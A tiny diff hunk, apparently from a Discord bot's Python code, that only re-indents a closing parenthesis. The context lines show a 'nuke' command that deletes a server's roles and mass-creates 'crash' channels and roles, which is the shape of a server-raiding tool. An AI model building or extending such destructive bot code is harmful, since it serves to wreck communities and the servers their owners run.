@@ -203,7 +203,7 @@ async def nuke(ctx):
         create_crash_channels(guild),
         delete_roles(guild),
         create_roles(guild)
-        )
+    )
 
 @bot.event
 async def on_guild_channel_create(channel):
